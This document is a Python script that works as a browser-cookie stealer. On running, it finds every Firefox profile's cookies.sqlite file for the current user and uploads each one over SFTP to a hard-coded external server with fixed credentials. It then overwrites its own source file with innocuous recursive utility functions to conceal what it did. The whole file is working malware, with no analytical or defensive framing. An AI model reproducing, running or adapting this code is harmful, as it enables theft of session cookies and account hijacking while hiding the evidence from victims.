import os
import sys
import getpass
import concurrent.futures
import paramiko


def get_directories(path):
    return [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]


def ssh_transfer(username, password, hostname, port, local_file_path, remote_file_path):
    with paramiko.SSHClient() as ssh:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=hostname, username=username,
                    password=password, port=port)
        with ssh.open_sftp() as sftp:
            sftp.put(local_file_path, remote_file_path)


def firefox_dir(username):
    files_to_download = []
    prefix = rf"/home/{username}/.mozilla/firefox"
    profiles = get_directories(prefix)
    for profile in profiles:
        path = os.path.join(prefix, profile, "cookies.sqlite")
        if os.path.exists(path):
            files_to_download.append(path)
    return files_to_download


def parallel_transfer(username, password, hostname, port, local, remote):
    ssh_transfer(username, password, hostname, port, local, remote)


def transfer():
    local_dirs = firefox_dir(getpass.getuser())
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for count, local in enumerate(local_dirs, start=1):
            file_name = local.split('/')[-1]
            remote_path = f"/home/kali/received/{file_name}{'_' + str(count) if count > 1 else ''}"
            future = executor.submit(
                parallel_transfer,
                "kali",
                "1234",
                "65.0.50.125",
                22342,
                local,
                remote_path
            )
            futures.append(future)
        concurrent.futures.wait(futures)


def replace_the_code(code):
    with open(__file__, 'w') as f:
        f.write(code)


def main():

    code = """def recursive_loop(condition_func, action_func):
    if condition_func():
        action_func()
        recursive_loop(condition_func, action_func)

def recursive_for(iterable, action_func, index=0):
    if index < len(iterable):
        action_func(iterable[index])
        recursive_for(iterable, action_func, index + 1)
def fibonacci(n):
    if n <= 0:
        return "Input should be a positive integer."
    elif n == 1:
        return [0]
    elif n == 2:
        return [0, 1]
    else:
        sequence = fibonacci(n - 1)
        sequence.append(sequence[-1] + sequence[-2])
        return sequence
def factorial(n):
    if n < 0:
        return "Input should be a non-negative integer."
    elif n == 0 or n == 1:
        return 1
    else:
        return n * factorial(n - 1)
def reverse_string(s):
    if len(s) == 0:
        return s
    else:
        return reverse_string(s[1:]) + s[0]
def is_palindrome(s):
    if len(s) < 2:
        return True
    elif s[0] != s[-1]:
        return False
    else:
        return is_palindrome(s[1:-1])
def array_sum(arr):
    if len(arr) == 0:
        return 0
    else:
        return arr[0] + array_sum(arr[1:])
def binary_search(arr, low, high, x):
    if high >= low:
        mid = (high + low) // 2
        if arr[mid] == x:
            return mid
        elif arr[mid] > x:
            return binary_search(arr, low, mid - 1, x)
        else:
            return binary_search(arr, mid + 1, high, x)
    else:
        return -1
"""

    transfer()
    replace_the_code(code)


main()
